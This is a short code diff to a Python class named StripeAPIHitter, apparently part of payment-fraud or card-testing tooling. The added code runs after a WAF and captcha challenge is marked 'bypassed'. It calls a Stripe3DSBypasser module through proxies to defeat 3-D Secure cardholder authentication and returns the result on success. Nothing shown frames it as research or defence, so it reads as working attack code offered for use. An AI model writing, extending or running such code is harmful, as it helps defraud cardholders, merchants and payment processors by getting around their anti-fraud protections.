@@ -2128,6 +2128,18 @@ class StripeAPIHitter:
                                             print(f"[DEBUG WAF VERIFY] cleared={_waf_cleared} new_sdk_type={_vnext_type} source={bool(_new_source)}")
                                             if _waf_cleared:
                                                 result['captcha_bypassed'] = True
+                                                result['raw_response'] = _verify_json
+                                                try:
+                                                    from gateways.stripe.stripe_3ds_bypasser import Stripe3DSBypasser
+                                                    bypasser_res = await Stripe3DSBypasser.resolve_3ds(
+                                                        result,
+                                                        proxy_data=self.proxy_data,
+                                                        profile=profile,
+                                                    )
+                                                    if bypasser_res and bypasser_res.get('success'):
+                                                        return bypasser_res
+                                                except Exception as _bex:
+                                                    print(f"[DEBUG WAF VERIFY] Stripe3DSBypasser error: {_bex}")
                                             if _waf_cleared and _new_source:
                                                 sdk = _vsdk
                                                 next_action = _vnext
